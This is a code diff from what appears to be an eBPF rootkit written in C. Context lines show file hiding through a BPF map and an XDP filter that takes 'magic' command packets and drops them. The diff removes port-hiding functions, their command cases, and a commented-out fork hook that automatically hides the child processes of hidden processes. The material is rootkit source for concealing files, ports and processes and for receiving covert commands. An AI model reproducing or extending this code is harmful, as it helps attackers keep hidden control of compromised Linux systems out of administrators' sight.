@@ -35,20 +35,6 @@ static void unhide_file(char *filename)
     bpf_map_delete_elem(&hide_names_map, filename);
 }
 
-static void hide_port(u32 port)
-{
-    u16 port_to_hide = (u16)port;
-    u8 value = 1;
-
-    bpf_map_update_elem(&hide_ports_map, &port_to_hide, &value, BPF_ANY);
-}
-
-static void unhide_port(u32 port)
-{
-    u16 port_to_unhide = (u16)port;
-    bpf_map_delete_elem(&hide_ports_map, &port_to_unhide);
-}
-
 /**
  * @brief Process command struct and execute command according
  * to the corrsponding opcode.
@@ -76,12 +62,6 @@ static int process_and_execute_command(struct command_packet *command)
     case COMMAND_UNHIDE_FILE:
         __builtin_memcpy(command_data, command->data, sizeof(command_data));
         unhide_file(command_data);
-        break;
-    case COMMAND_HIDE_PORT:
-        hide_port(command->arg);
-        break;
-    case COMMAND_UNHIDE_PORT:
-        unhide_port(command->arg);
         break;
     default:
         return -ENOENT; /* Normal UDP traffic */
@@ -163,40 +143,3 @@ int filter_magic_packets(struct xdp_md *ctx)
     /* Drop the packet at driver level */
     return XDP_DROP;
 }
-
-// #include "vmlinux.h"
-// #include <bpf/bpf_helpers.h>
-// #include <bpf/bpf_tracing.h>
-
-// struct trace_event_raw_sched_process_fork {
-//     struct trace_entry ent;
-//     char parent_comm[16];
-//     pid_t parent_pid;
-//     char child_comm[16];
-//     pid_t child_pid;
-// };
-
-// SEC("tp/sched/sched_process_fork")
-// int handle_fork(struct trace_event_raw_sched_process_fork *ctx)
-// {
-//     /* Convert parent PID to ASCII string to check map */
-//     char parent_pid_str[32] = {0};
-//     /* (Use a helper or simple snprintf/itoa logic to build parent_pid_str) */
-
-//     /* Check if the parent process is currently hidden */
-//     u8 *is_parent_hidden = bpf_map_lookup_elem(&hide_names_map, parent_pid_str);
-    
-//     if (is_parent_hidden) {
-//         /* Convert child PID to string */
-//         char child_pid_str[32] = {0};
-//         /* (Format child_pid into child_pid_str) */
-
-//         /* Automatically add newly spawned child PID/TID to hide_names_map */
-//         u8 val = 1;
-//         bpf_map_update_elem(&hide_names_map, child_pid_str, &val, BPF_ANY);
-        
-//         bpf_printk("Auto-hiding child PID: %d (Parent: %d)\n", ctx->child_pid, ctx->parent_pid);
-//     }
-
-//     return 0;
-// }
